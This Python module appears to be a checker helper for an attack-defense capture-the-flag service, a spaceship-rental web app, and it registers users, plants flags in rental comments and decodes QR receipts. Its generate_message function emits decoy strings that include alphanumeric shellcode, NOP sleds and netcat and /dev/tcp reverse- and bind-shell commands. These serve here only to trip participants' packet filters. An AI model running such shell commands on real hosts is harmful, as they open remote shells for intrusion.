import random
import os
import base64
import string
import datetime
import logging

from urllib.parse import unquote_to_bytes
from PIL import Image, ImageOps
import io
from pyzbar.pyzbar import decode, ZBarSymbol

PORT = 35244

def generate_message():
    "returns a string that hopefully triggers some packet filtering"
    
    return random.choice([
        os.urandom(random.randint(4, 128)).hex(),
        base64.b64encode(os.urandom(random.randint(4, 128))).decode(),
        'A' * random.randint(4, 16),
        'B' * random.randint(4, 16),
        "\x90" * random.randint(4, 16),
        r"TX-3399-Purr-!TTTP\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6- 99w%-ptt%P-%w%%-qqqq-",
        r"jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT-%NN0-%o42-7a-0P-xGGx-rrrx- aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPP",
        'Never gonna give you up, never gonna let you down',
          '/bin/sh -c "/bin/{} -l -p {} -e /bin/sh"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535)),
        '/bin/sh -c "/bin/{} -e /bin/sh 10.66.{}.{} {}"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
        '/bin/bash -i >& /dev/tcp/10.66.{}.{}/{} 0>&1'.format(random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
    ]).encode()

def get_garage(self, session):
    url = F"http://[{self.ip}]:{PORT}/garage"
    response = session.get(url)
    if response.status_code != 200:
        raise ValueError(F"Could not get garage page: Status code {response.status_code}, url: \"{url}\", response: \"{response.text}\"")
    return response.text

def get_nonexistent(self, session):
    url = F"http://[{self.ip}]:{PORT}/{rand_string_letters(random.randint(9, 16))}"
    response = session.get(url)
    if response.status_code != 408:
        raise ValueError(F"Could not get out-of-fuel page: Status code {response.status_code}, url: \"{url}\", response: \"{response.text}\"")
    return response.text

def do_register(self, session, username, password):
    url = F"http://[{self.ip}]:{PORT}/register"
    response = session.post(url, data={"username": username, "password": password})
    if response.status_code != 200:
        raise ValueError(F"Could not register user \"{username}\" with password \"{password}\": Status code {response.status_code}, url: \"{url}\", response: \"{response.text}\"")


def do_login(self, session, username, password):
    url = F"http://[{self.ip}]:{PORT}/login"
    response = session.post(url, data={"username": username, "password": password})
    if response.status_code != 200:
        raise ValueError(F"Could not login user \"{username}\" with password \"{password}\": Status code {response.status_code}, url: \"{url}\", response: \"{response.text}\"")

def do_logout(self, session):
    url = F"http://[{self.ip}]:{PORT}/logout"
    response = session.get(url)
    if response.status_code != 200:
        raise ValueError(F"Could not log out: Status code {response.status_code}, url: \"{url}\", response: \"{response.text}\"")

def do_rent(self, session, firstname, lastname, startdate, enddate, comment):
    url = F"http://[{self.ip}]:{PORT}/rent"
    data = {
        "firstname": firstname,
        "lastname":  lastname,
        "startdate": startdate.isoformat(),
        "enddate":   enddate.isoformat(),
        "comments":  comment
    }
    response = session.post(url, data=data)
    if response.status_code != 200:
        raise ValueError(F"Could not rent {data}: Status code {response.status_code}, url: \"{url}\", response: \"{response.text}\"")

def fetch_receipts(self, session):
    url = F"http://[{self.ip}]:{PORT}/receipts"
    response = session.get(url)
    if response.status_code != 200:
        raise ValueError(F"Could not fetch receipts: Status code: \"{response.status_code}\", url: \"{url}\", response: \"{response.text}\"")
    return response.text

def rand_string_letters_numbers(n):
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))

def rand_string_letters(n):
    return "".join(random.choices(string.ascii_letters, k=n))

def rand_date():
    start = datetime.date(2030, 1, 1)
    end   = datetime.date(2185, 1, 1)
    return start + (end - start) * random.random()

def rand_flag_comment(flag):
    sentences = [
        "Please add the logo {} to the left side of the spaceship",
        "We need one child safety seat of type {}",
        "{}",
        "Please use {}-class thrusters",
        "Provide a {}-rated shield generator as backup",
        "A {}-sensor is required",
        "The navigation system needs to be {}-compatible",
        "The cockpit display needs a {}-style overlay",
        "{} brand seats are appreciated",
        "Please include the {} air filtration system",
        "Please upgrade to the {}-series autopilot system",
        "All windows must have {}-certification",
        "{}-grade or better hull plating is required",
        "Firmware version {} is required in the brake system",
        "Our navigation team needs 4 {}-detectors",
    ]
    return random.choice(sentences).format(flag)

def read_receipt_img_soup(soup):
    try:
        imageuri = soup["src"]
        imagedata = imageuri[imageuri.find(",") + 1:]
        imagedata = unquote_to_bytes(imagedata)
        image = Image.open(io.BytesIO(imagedata))
        qrcodes = [ ImageOps.expand(img, border=5, fill="white") for img in image.convert("RGB").split() ]
        decodings = [ decode(qrcode, symbols=[ZBarSymbol.QRCODE]) for qrcode in qrcodes ]
        datas = [ d[0].data for d in decodings ]
        return datas
    except Exception as e:
        logging.warning(F"Could not read receipt img soup: {e}")
        return None
